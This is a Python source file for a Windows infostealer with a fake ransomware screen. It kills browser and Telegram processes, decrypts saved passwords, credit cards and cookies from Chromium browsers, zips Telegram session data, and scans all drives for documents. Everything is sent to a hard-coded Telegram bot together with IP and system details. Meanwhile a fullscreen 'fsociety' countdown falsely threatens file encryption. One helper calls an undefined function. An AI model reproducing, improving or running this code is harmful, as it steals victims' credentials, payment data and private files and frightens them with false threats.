import base64
import json
import os
import shutil
import sqlite3
from datetime import datetime, timedelta
import requests
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
import ctypes
import socket
import platform
import psutil
import time
import glob
import subprocess
import win32file
import tempfile
import zipfile
from concurrent.futures import ThreadPoolExecutor
import pygame
from io import BytesIO
from PIL import Image
import logging

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Telegram bot configuration
TELEGRAM_TOKEN = "7861405727:AAGBH5bDiwOsEHavNxIHJkj3fbd_tToYOPA"
TELEGRAM_CHAT_ID = "6495986971"
TELEGRAM_API_URL = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendDocument"

# File collection configuration
ALLOWED_EXTENSIONS = ['.txt', '.pdf', '.docx', '.xls']
BLACKLISTED_DIRS = ['C:\\Windows\\', 'C:\\Program Files\\', 'C:\\Program Files (x86)\\', 'C:\\$Recycle.Bin\\', 'C:\\AMD\\']
MAX_FILE_SIZE_MB = 50  # Maximum file size for collection

# Display configuration
GIF_URL = "https://www.dropbox.com/scl/fi/rxtdieh3ke6wfskito3p0/fsociety.gif?rlkey=d184nx0yaohfgulvo12ok1712&e=1&st=5cgq916n&dl=1"
AUDIO_URL = "https://www.dropbox.com/scl/fi/1jbioek3zkoslys957l19/apihost.ru_QwllBuqQkzqaj4ZNgZlg.wav?rlkey=46wja4m957euc765q70ymrcbg&e=1&st=ylq7tzuq&dl=1"
texts = {
    'ru': "привет или, может быть, черт возьми, нет, мы fsociety. Ваша система взломана, все ваши файлы у нас в руках. По истечению таймера все ваши файлы будут зашифрованы.",
    'en': "hello or maybe hell no, we are fsociety. Your system has been hacked, all your files are in our hands. After the timer expires, all your files will be encrypted.",
}

appdata = os.getenv('LOCALAPPDATA')
appdata_roaming = os.getenv('APPDATA')
user_profile = os.getenv('USERPROFILE')

browsers = {
    'google-chrome': {
        'path': f'{user_profile}\\AppData\\Local\\Google\\Chrome\\User Data',
        'process': 'chrome.exe',
        'login_data': 'Login Data',
        'type': 'chromium'
    },
    'firefox': {
        'path': f'{appdata_roaming}\\Mozilla\\Firefox\\Profiles',
        'process': 'firefox.exe',
        'login_data': 'logins.json',
        'type': 'firefox'
    },
    'yandex': {
        'path': f'{user_profile}\\AppData\\Local\\Yandex\\YandexBrowser\\User Data',
        'process': 'browser.exe',
        'login_data': 'Ya Login Data',
        'type': 'chromium'
    },
    'opera': {
        'path': f'{appdata_roaming}\\Opera Software\\Opera Stable',
        'process': 'opera.exe',
        'login_data': 'Login Data',
        'type': 'chromium'
    },
    'amigo': {
        'path': f'{user_profile}\\AppData\\Local\\Amigo\\User Data',
        'process': 'browser.exe',
        'login_data': 'Login Data',
        'type': 'chromium'
    },
    'edge': {
        'path': f'{user_profile}\\AppData\\Local\\Microsoft\\Edge\\User Data',
        'process': 'msedge.exe',
        'login_data': 'Login Data',
        'type': 'chromium'
    }
}

data_queries = {
    'login_data': {
        'query': 'SELECT action_url, username_value, password_value FROM logins',
        'file': None,  # Set dynamically
        'columns': ['URL', 'Email', 'Password'],
        'decrypt': True
    },
    'credit_cards': {
        'query': 'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards',
        'file': 'Web Data',
        'columns': ['Name On Card', 'Card Number', 'Expires On', 'Added On'],
        'decrypt': True
    },
    'cookies': {
        'query': 'SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies',
        'file': 'Network\\Cookies',
        'columns': ['Host Key', 'Cookie Name', 'Path', 'Cookie', 'Expires On'],
        'decrypt': True
    },
    'history': {
        'query': 'SELECT url, title, last_visit_time FROM urls',
        'file': 'History',
        'columns': ['URL', 'Title', 'Visited Time'],
        'decrypt': False
    },
    'downloads': {
        'query': 'SELECT tab_url, target_path FROM downloads',
        'file': 'History',
        'columns': ['Download URL', 'Local Path'],
        'decrypt': False
    }
}

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def get_chrome_version():
    try:
        path = os.path.join(appdata, r'Google\Chrome\Application\chrome.exe')
        if not os.path.exists(path):
            return "Unknown"
        info = subprocess.check_output(['wmic', 'datafile', 'where', f'name="{path.replace("\\", "\\\\")}"', 'get', 'Version']).decode()
        version = info.splitlines()[1].strip()
        return version
    except Exception as e:
        logging.error(f"Error getting Chrome version: {str(e)}")
        return "Unknown"

def get_master_key(path: str):
    if not os.path.exists(path):
        logging.error(f"Browser path not found: {path}")
        return None
    local_state_path = os.path.join(path, 'Local State')
    if not os.path.exists(local_state_path):
        logging.error(f"Local State file not found: {local_state_path}")
        return None
    with open(local_state_path, 'r', encoding='utf-8') as f:
        c = f.read()
    if 'os_crypt' not in c:
        logging.error(f"os_crypt not found in Local State")
        return None
    local_state = json.loads(c)
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]  # Remove 'DPAPI' prefix
    try:
        key = CryptUnprotectData(key, None, None, None, 0)[1]
        logging.info(f"Master key: {key.hex()}")
        return key
    except Exception as e:
        logging.error(f"Error decrypting master key: {str(e)}")
        return None

def copy_locked_file(src, dst):
    try:
        h_src = win32file.CreateFile(
            src,
            win32file.GENERIC_READ,
            win32file.FILE_SHARE_READ | win32file.FILE_SHARE_WRITE,
            None,
            win32file.OPEN_EXISTING,
            0,
            None
        )
        content = win32file.ReadFile(h_src, os.path.getsize(src))[1]
        with open(dst, 'wb') as f:
            f.write(content)
        win32file.CloseHandle(h_src)
    except Exception as e:
        logging.error(f"Error copying locked file {src}: {str(e)}")
        raise RuntimeError("Error copying locked file")

def decrypt_password(encrypted_password: bytes, key: bytes) -> str:
    try:
        if not encrypted_password:
            return '[Empty]'
        if encrypted_password.startswith(b'v10') or encrypted_password.startswith(b'v11'):
            if len(encrypted_password) < 31:
                return f"[Invalid Format: Too short (length={len(encrypted_password)})]"
            nonce = encrypted_password[3:15]
            ciphertext_tag = encrypted_password[15:]
            ciphertext = ciphertext_tag[:-16]
            tag = ciphertext_tag[-16:]
            if len(nonce) != 12 or len(ciphertext_tag) < 16:
                return f"[Invalid Format: Nonce={len(nonce)}, Ciphertext+Tag={len(ciphertext_tag)}]"
            cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
            decrypted_data = cipher.decrypt_and_verify(ciphertext, tag)
            encodings = ['utf-8', 'latin-1', 'windows-1252']
            for enc in encodings:
                try:
                    decoded = decrypted_data.decode(enc)
                    if decoded.isprintable() and len(decoded) >= 1 and not any(c in decoded for c in '\x00\x01\x02\x03'):
                        return decoded
                except UnicodeDecodeError:
                    continue
            return f"[Non-Decodable Data: {decrypted_data.hex()}]"
        try:
            decrypted = CryptTerraUnprotectData(encrypted_password, None, None, None, 0)[1]
            decoded = decrypted.decode('utf-8', errors='ignore')
            if decoded and decoded.isprintable():
                return decoded
        except Exception:
            pass
        if encrypted_password.startswith(b'v20'):
            return f"[Non-Standard Format: v20 prefix, Raw={encrypted_password.hex()}]"
        return f"[Invalid Format: Unknown prefix, Raw={encrypted_password.hex()}]"
    except Exception as e:
        return f"[Decryption Error: {str(e)}]"

def decrypt_firefox_passwords(logins_file: str) -> str:
    try:
        with open(logins_file, 'r', encoding='utf-8') as f:
            logins = json.load(f)
        result = ""
        for login in logins.get('logins', []):
            url = login.get('hostname', '')
            username = login.get('username', '')
            encrypted_password = login.get('encryptedPassword', '')
            result += f"URL: {url}\nEmail: {username}\nPassword: [Requires NSS Decryption: {encrypted_password}]\n\n"
        return result
    except Exception as e:
        logging.error(f"Error parsing Firefox logins.json: {str(e)}")
        return None

def hide_folder(path: str):
    FILE_ATTRIBUTE_HIDDEN = 0x02
    ctypes.windll.kernel32.SetFileAttributesW(path, FILE_ATTRIBUTE_HIDDEN)

def save_results(browser_name, data_buffer):
    if not os.path.exists(browser_name):
        os.mkdir(browser_name)
        hide_folder(browser_name)
    output_file = f'{browser_name}/{browser_name}_data.txt'
    try:
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write(data_buffer)
        logging.info(f"Saved all data in {output_file}")
        send_to_telegram(output_file)
    except Exception as e:
        logging.error(f"Error saving {output_file}: {str(e)}")

def get_ip():
    try:
        public_ip = requests.get('https://api.ipify.org', timeout=5).text
    except requests.RequestException:
        public_ip = 'N/A'
    local_ip = socket.gethostbyname(socket.gethostname())
    return public_ip, local_ip

def get_system_info():
    return {
        "System": platform.system(),
        "Node Name": platform.node(),
        "Release": platform.release(),
        "Version": platform.version(),
        "Machine": platform.machine(),
        "Processor": platform.processor(),
        "CPU Cores": psutil.cpu_count(logical=True),
        "Total RAM (GB)": round(psutil.virtual_memory().total / (1024**3), 2)
    }

def send_to_telegram(file_path):
    public_ip, local_ip = get_ip()
    system_info = get_system_info()
    file_name = os.path.basename(file_path)
    caption = (
        f"File: {file_name}\n"
        f"Public IP: {public_ip}\n"
        f"Local IP: {local_ip}\n\n"
        f"System Information:\n" + "\n".join(f"{k}: {v}" for k, v in system_info.items())
    )
    try:
        file_size = os.path.getsize(file_path) / (1024 * 1024)  # Size in MB
        logging.info(f"Preparing to send {file_name} ({file_size:.2f} MB)")
        with open(file_path, 'rb') as f:
            files = {'document': (file_name, f)}
            data = {'chat_id': TELEGRAM_CHAT_ID, 'caption': caption}
            response = requests.post(TELEGRAM_API_URL, data=data, files=files, timeout=30)
            if response.status_code == 200:
                logging.info(f"Successfully sent {file_name} to Telegram")
                return True
            else:
                logging.error(f"Failed to send {file_name} to Telegram: HTTP {response.status_code}, Response: {response.text}")
                return False
    except Exception as e:
        logging.error(f"Error sending {file_name} to Telegram: {str(e)}")
        return False

def zip_tdata():
    username = os.getlogin()
    patharchive = os.path.join(f"C:\\Users\\{username}\\AppData\\Roaming\\Telegram Desktop", "tdata")
    zip_file = os.path.join(os.getcwd(), "tdata.zip")
    temp_dir = tempfile.mkdtemp(prefix="tdata_")
    
    if not os.path.exists(patharchive):
        logging.error(f"Telegram tdata path not found: {patharchive}")
        shutil.rmtree(temp_dir, ignore_errors=True)
        return
    
    try:
        total_size = 0
        for item in os.listdir(patharchive):
            if item.lower() in ['emoji', 'dumps', 'media', 'cache']:
                continue
            item_path = os.path.join(patharchive, item)
            temp_item_path = os.path.join(temp_dir, item)
            if os.path.isdir(item_path):
                shutil.copytree(item_path, temp_item_path, copy_function=shutil.copyfile)
            else:
                shutil.copyfile(item_path, temp_item_path)
            total_size += sum(os.path.getsize(os.path.join(root, f)) for root, _, files in os.walk(temp_item_path) for f in files) if os.path.isdir(item_path) else os.path.getsize(temp_item_path)
        
        logging.info(f"Total size of copied tdata: {total_size / (1024 * 1024):.2f} MB")
        
        with zipfile.ZipFile(zip_file, 'w', compression=zipfile.ZIP_DEFLATED, compresslevel=9) as zf:
            for root, _, files in os.walk(temp_dir):
                for file in files:
                    file_path = os.path.join(root, file)
                    arcname = os.path.relpath(file_path, temp_dir)
                    zf.write(file_path, arcname)
        
        file_size = os.path.getsize(zip_file) / (1024 * 1024)
        logging.info(f"Created {zip_file} ({file_size:.2f} MB)")
        
        if send_to_telegram(zip_file):
            logging.info(f"Successfully sent {zip_file}")
        else:
            logging.error(f"Failed to send {zip_file}")
        
        try:
            os.remove(zip_file)
            logging.info(f"Removed {zip_file}")
        except Exception as e:
            logging.error(f"Error removing {zip_file}: {str(e)}")
    
    except Exception as e:
        logging.error(f"Error in zip_tdata: {str(e)}")
    
    finally:
        shutil.rmtree(temp_dir, ignore_errors=True)

def close_browser_processes(browser_name: str):
    process_name = browsers[browser_name]['process']
    logging.info(f"Closing {browser_name} processes ({process_name})")
    try:
        subprocess.check_call(
            ["taskkill", "/f", "/im", process_name, "/t"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        time.sleep(0.5)
        for proc in psutil.process_iter(['name']):
            if proc.info['name'].lower() == process_name.lower():
                proc.terminate()
                try:
                    proc.wait(timeout=2)
                    logging.info(f"Terminated process {process_name} (PID: {proc.pid})")
                except psutil.TimeoutExpired:
                    proc.kill()
                    logging.info(f"Force-killed process {process_name} (PID: {proc.pid})")
        return True
    except psutil.NoSuchProcess:
        logging.info(f"Process {process_name} not found")
        return True
    except psutil.AccessDenied:
        logging.error(f"Access denied when terminating {process_name}. Try running as Administrator")
        return False
    except Exception as e:
        logging.error(f"Error closing {process_name}: {str(e)}")
        return False

def get_firefox_profile_path(base_path: str):
    profile_dirs = glob.glob(os.path.join(base_path, '*'))
    for profile_dir in profile_dirs:
        if os.path.isdir(profile_dir):
            logins_file = os.path.join(profile_dir, 'logins.json')
            if os.path.exists(logins_file):
                logging.info(f"Found Firefox profile with logins.json: {profile_dir}")
                return profile_dir
    logging.error(f"No Firefox profile with logins.json found in {base_path}")
    return None

def get_data(path: str, profile: str, key, type_of_data, browser_name: str):
    browser_type = browsers[browser_name]['type']
    base_path = os.path.join(path, profile)
    
    if browser_type == 'firefox':
        if type_of_data['file'] != browsers[browser_name]['login_data']:
            logging.error(f"Skipping {type_of_data['file']} for Firefox (not supported)")
            return None
        profile_path = get_firefox_profile_path(path)
        if not profile_path:
            logging.error(f"No Firefox profile with logins.json found in {path}")
            return None
        db_file = os.path.join(profile_path, type_of_data['file'])
    else:
        db_file = os.path.join(base_path, type_of_data['file'])

    if not os.path.exists(db_file):
        logging.error(f"Database file not found: {db_file}")
        return None
    
    try:
        file_size = os.path.getsize(db_file)
        logging.info(f"Processing database: {db_file} (Size: {file_size} bytes)")
        
        with open(db_file, 'rb') as f:
            f.read(1)
    except Exception as e:
        logging.error(f"Cannot read database file {db_file}: {str(e)}")
        return None
    
    if browser_type == 'firefox' and type_of_data['file'].endswith('logins.json'):
        return decrypt_firefox_passwords(db_file)

    result = []
    conn = None
    temp_dir = tempfile.mkdtemp()
    temp_db = os.path.join(temp_dir, f'temp_db_{browser_name}_{type_of_data["file"].replace("\\", "_")}_{int(time.time())}')
    
    for attempt in range(3):
        try:
            copy_locked_file(db_file, temp_db)
            conn = sqlite3.connect(f"file:{temp_db}?mode=ro", uri=True)
            cursor = conn.cursor()
            
            cursor.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='logins'")
            if not cursor.fetchone() and type_of_data['file'] == browsers[browser_name]['login_data']:
                logging.error(f"No 'logins' table in {db_file}")
                return None
            
            cursor.execute(type_of_data['query'])
            rows = cursor.fetchall()
            logging.info(f"Found {len(rows)} records in {type_of_data['file']}")
            
            for row in rows:
                row = list(row)
                if type_of_data['decrypt']:
                    for i in range(len(row)):
                        if isinstance(row[i], bytes):
                            decrypted = decrypt_password(row[i], key)
                            if decrypted.startswith('[Invalid') or decrypted.startswith('[Decryption Error'):
                                try:
                                    decrypted_data = CryptUnprotectData(row[i], None, None, None, 0)[1]
                                    decoded = decrypted_data.decode('utf-8', errors='ignore')
                                    if decoded and decoded.isprintable():
                                        row[i] = decoded
                                    else:
                                        row[i] = decrypted
                                except Exception:
                                    row[i] = decrypted
                            else:
                                row[i] = decrypted
                        elif row[i] == '':
                            row[i] = '[Empty]'
                if type_of_data['file'] == 'History' and type_of_data['query'].startswith('SELECT url, title'):
                    if row[2] != 0:
                        row[2] = convert_chrome_time(row[2])
                    else:
                        row[2] = "0"
                result.append("\n".join([f"{col}: {val}" for col, val in zip(type_of_data['columns'], row)]) + "\n\n")
            break
        except Exception as e:
            logging.error(f"Error accessing {db_file} (Attempt {attempt+1}/3): {str(e)}")
            if attempt < 2:
                time.sleep(0.5)
            continue
        finally:
            if conn:
                conn.close()
            if os.path.exists(temp_db):
                try:
                    os.remove(temp_db)
                except Exception as e:
                    logging.error(f"Error removing temp_db: {str(e)}")
            shutil.rmtree(temp_dir, ignore_errors=True)
    
    return "".join(result) if result else None

def convert_chrome_time(chrome_time):
    return (datetime(1601, 1, 1) + timedelta(microseconds=chrome_time)).strftime('%d/%m/%Y %H:%M:%S')

def get_profiles(path: str):
    profiles = ['Default']
    profile_dir = os.path.join(path)
    if os.path.exists(profile_dir):
        for item in os.listdir(profile_dir):
            item_path = os.path.join(profile_dir, item)
            if os.path.isdir(item_path) and item.startswith('Profile '):
                profiles.append(item)
    return profiles

def installed_browsers():
    available = []
    for browser in browsers:
        browser_path = browsers[browser]['path']
        if browser == 'firefox':
            if os.path.exists(browser_path):
                profile_path = get_firefox_profile_path(browser_path)
                if profile_path:
                    available.append(browser)
        elif os.path.exists(browser_path):
            available.append(browser)
    return available

def delete_folder(path: str):
    if os.path.exists(path):
        try:
            shutil.rmtree(path)
            logging.info(f"Cartella {path} eliminata.")
        except Exception as e:
            logging.error(f"Error deleting folder {path}: {str(e)}")

def check_file(file_path):
    try:
        ext = os.path.splitext(file_path)[1].lower()
        size = os.path.getsize(file_path)
        if ext not in ALLOWED_EXTENSIONS or size > MAX_FILE_SIZE_MB * 1024 * 1024 or not os.access(file_path, os.R_OK) or any(blacklisted_dir in file_path for blacklisted_dir in BLACKLISTED_DIRS):
            return False
        return True
    except Exception:
        return False

def upload_file(file_path):
    try:
        with open(file_path, 'rb') as f:
            files = {'document': (os.path.basename(file_path), f)}
            data = {'chat_id': TELEGRAM_CHAT_ID, 'caption': f"File: {os.path.basename(file_path)}"}
            response = requests.post(TELEGRAM_API_URL, data=data, files=files, timeout=30)
            if response.status_code == 429:
                retry_after = response.json().get('parameters', {}).get('retry_after', 1)
                logging.error(f"Rate limit exceeded for {file_path}, retrying after {retry_after} seconds")
                time.sleep(retry_after)
                return upload_file(file_path)
            elif response.status_code == 200:
                logging.info(f"Successfully uploaded {file_path} to Telegram")
                return True
            else:
                logging.error(f"Failed to upload {file_path} to Telegram: HTTP {response.status_code}")
                return False
    except Exception as e:
        logging.error(f"Error uploading {file_path} to Telegram: {str(e)}")
        return False

def search_files(root_dir):
    try:
        for root, _, files in os.walk(root_dir, topdown=True):
            if any(blacklisted_dir in root for blacklisted_dir in BLACKLISTED_DIRS):
                continue
            for file in files:
                file_path = os.path.join(root, file)
                if check_file(file_path):
                    upload_file(file_path)
    except Exception as e:
        logging.error(f"Error scanning {root_dir}: {str(e)}")

def collect_files():
    drives = [f"{d}:\\" for d in "ABCDEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists(f"{d}:")]
    with ThreadPoolExecutor(max_workers=6) as executor:
        executor.map(search_files, drives)
    logging.info("File collection completed")

def display_fullscreen():
    pygame.init()
    
    # Получаем реальное разрешение экрана
    screen_info = pygame.display.Info()
    SCREEN_WIDTH, SCREEN_HEIGHT = screen_info.current_w, screen_info.current_h
    screen = pygame.display.set_mode((SCREEN_WIDTH, SCREEN_HEIGHT), pygame.FULLSCREEN | pygame.NOFRAME)
    pygame.display.set_caption("fsociety")
    
    logging.info(f"Actual screen resolution: {SCREEN_WIDTH}x{SCREEN_HEIGHT}")
    
    # Функция загрузки и масштабирования GIF
    def load_gif_frames(url):
        try:
            response = requests.get(url)
            img_data = BytesIO(response.content)
            img = Image.open(img_data)
            original_width, original_height = img.size
            
            # Вычисляем коэффициенты масштабирования
            width_ratio = SCREEN_WIDTH / original_width
            height_ratio = SCREEN_HEIGHT / original_height
            scale_factor = min(width_ratio, height_ratio)
            
            # Новые размеры с сохранением пропорций
            new_width = int(original_width * scale_factor)
            new_height = int(original_height * scale_factor)
            
            frames = []
            durations = []
            while True:
                try:
                    # Конвертируем и масштабируем каждый кадр
                    pil_img = img.convert('RGB')
                    pil_img = pil_img.resize((new_width, new_height), Image.Resampling.LANCZOS)
                    frame = pygame.image.fromstring(pil_img.tobytes(), pil_img.size, 'RGB')
                    frames.append(frame)
                    durations.append(img.info.get('duration', 100) / 1000.0)
                    img.seek(img.tell() + 1)
                except EOFError:
                    break
            
            logging.info(f"Loaded {len(frames)} GIF frames, scaled to {new_width}x{new_height}")
            return frames, durations, new_width, new_height
            
        except Exception as e:
            logging.error(f"Error loading GIF: {str(e)}")
            # Создаем черный фон как запасной вариант
            fallback = pygame.Surface((SCREEN_WIDTH, SCREEN_HEIGHT))
            fallback.fill((0, 0, 0))
            return [fallback], [0.1], SCREEN_WIDTH, SCREEN_HEIGHT
    
    # Загружаем GIF
    gif_frames, frame_durations, gif_width, gif_height = load_gif_frames(GIF_URL)
    current_frame = 0
    frame_time = 0
    
    # Вычисляем позицию для точного центрирования
    x_pos = (SCREEN_WIDTH - gif_width) // 2
    y_pos = (SCREEN_HEIGHT - gif_height) // 2
    
    logging.info(f"GIF position: x={x_pos}, y={y_pos} (center: {SCREEN_WIDTH//2}x{SCREEN_HEIGHT//2})")
    
    # Загрузка аудио
    try:
        audio_response = requests.get(AUDIO_URL)
        audio_data = BytesIO(audio_response.content)
        sound = pygame.mixer.Sound(audio_data)
    except Exception as e:
        logging.error(f"Error loading audio: {str(e)}")
        sound = None
    
    # Таймер обратного отсчета (3 часа)
    countdown_duration = 3 * 3600
    start_time = time.time()
    
    # Шрифт для таймера
    try:
        timer_font = pygame.font.SysFont('verdana', 100, bold=False)
    except:
        timer_font = pygame.font.Font(None, 100)
    
    # Цвета
    RED = (255, 0, 0)
    BLACK = (0, 0, 0)
    
    # Состояния клавиш для выхода
    k_pressed = False
    seven_pressed = False
    
    # Интервал воспроизведения аудио (30 секунд)
    last_audio_play = 0
    audio_interval = 30
    
    global should_exit
    clock = pygame.time.Clock()
    
    # Основной цикл отображения
    while not should_exit:
        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                should_exit = True
            elif event.type == pygame.KEYDOWN:
                if event.key == pygame.K_k:
                    k_pressed = True
                elif event.key == pygame.K_7:
                    seven_pressed = True
            elif event.type == pygame.KEYUP:
                if event.key == pygame.K_k:
                    k_pressed = False
                elif event.key == pygame.K_7:
                    seven_pressed = False
        
        # Комбинация для выхода (K+7)
        if k_pressed and seven_pressed:
            should_exit = True
            break
        
        # Анимация GIF
        frame_time += clock.get_time() / 1000.0
        if frame_time >= frame_durations[current_frame]:
            frame_time = 0
            current_frame = (current_frame + 1) % len(gif_frames)
        
        # Воспроизведение аудио
        current_time = time.time()
        if sound and (current_time - last_audio_play >= audio_interval):
            sound.play()
            last_audio_play = current_time
        
        # Очистка экрана
        screen.fill((0, 0, 0))
        
        # Отображение GIF (точно по центру)
        screen.blit(gif_frames[current_frame], (x_pos, y_pos))
        
        # Таймер обратного отсчета
        elapsed = current_time - start_time
        remaining = max(0, countdown_duration - elapsed)
        hours, remainder = divmod(int(remaining), 3600)
        minutes, seconds = divmod(remainder, 60)
        timer_text = f"{hours}:{minutes:02d}:{seconds:02d}"
        
        # Рендерим текст таймера
        timer_surface = timer_font.render(timer_text, True, RED)
        timer_shadow = timer_font.render(timer_text, True, BLACK)
        
        # Позиционируем таймер внизу по центру
        timer_rect = timer_surface.get_rect(center=(SCREEN_WIDTH // 2, SCREEN_HEIGHT - 100))
        screen.blit(timer_shadow, timer_rect.move(2, 2))
        screen.blit(timer_surface, timer_rect)
        
        pygame.display.flip()
        clock.tick(60)
    
    pygame.quit()

def process_browser(browser):
    browser_path = browsers[browser]['path']
    profiles = get_profiles(browser_path) if browsers[browser]['type'] == 'chromium' else ['']
    master_key = get_master_key(browser_path) if browsers[browser]['type'] == 'chromium' else None
    
    if not close_browser_processes(browser):
        logging.error(f"Continuing with {browser} despite process termination issues")
    else:
        time.sleep(0.5)
    
    logging.info(f"Getting Stored Details from {browser}")
    data_buffer = f"Data for {browser}\n{'='*40}\n\n"
    for profile in profiles:
        logging.info(f"Processing profile: {profile or 'Default'}")
        for data_type_name, data_type in data_queries.items():
            if data_type_name == 'login_data':
                data_type['file'] = browsers[browser]['login_data']
            else:
                data_type['file'] = data_queries[data_type_name]['file']
            logging.info(f"Getting {data_type_name.replace('_', ' ').capitalize()}")
            data = get_data(browser_path, profile, master_key, data_type, browser)
            if data:
                data_buffer += f"{data_type_name.replace('_', ' ').capitalize()} (Profile: {profile or 'Default'})\n{'-'*20}\n{data}\n"
            else:
                data_buffer += f"{data_type_name.replace('_', ' ').capitalize()} (Profile: {profile or 'Default'})\n{'-'*20}\nNo data found.\n\n"
            logging.info("------")
    save_results(browser, data_buffer)

if __name__ == '__main__':
    if not is_admin():
        logging.warning("Script is not running as Administrator. Some files may be inaccessible.")
    
    # Initialize Pygame and start display in a separate thread
    should_exit = False
    pygame.init()
    try:
        with ThreadPoolExecutor(max_workers=1) as executor:
            display_future = executor.submit(display_fullscreen)
            
            # Step 1: Terminate Telegram and send tdata
            try:
                subprocess.check_call(
                    ["taskkill", "/f", "/im", "Telegram.exe"],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
                logging.info("Terminated Telegram process")
                time.sleep(0.5)
            except Exception as e:
                logging.error(f"Error terminating Telegram process: {str(e)}")
            
            zip_tdata()
            
            # Step 2: Process browsers in parallel
            chrome_version = get_chrome_version()
            logging.info(f"Chrome version: {chrome_version}")
            
            available_browsers = installed_browsers()
            logging.info(f"Detected browsers: {', '.join(available_browsers)}")
            
            with ThreadPoolExecutor(max_workers=4) as executor:
                executor.map(process_browser, available_browsers)
            
            # Step 3: Collect and send other files
            logging.info("Starting file collection")
            collect_files()
            
            # Wait for display to finish if not already exited
            display_future.result()
            
            # Cleanup
            for browser in browsers:
                delete_folder(browser)
    
    except Exception as e:
        logging.error(f"Error in main execution: {str(e)}")
    finally:
        should_exit = True
        pygame.quit()